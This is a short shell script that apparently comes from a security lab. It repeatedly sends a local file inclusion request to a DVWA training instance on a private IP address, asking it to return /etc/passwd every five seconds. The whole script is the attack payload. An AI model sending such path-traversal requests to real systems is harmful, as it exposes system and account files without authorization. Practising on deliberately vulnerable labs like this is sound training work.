#!/bin/sh
while true
do
    curl http://172.16.1.20/dvwa/vulnerabilities/fi/?page=/etc/passwd
    sleep 5
done
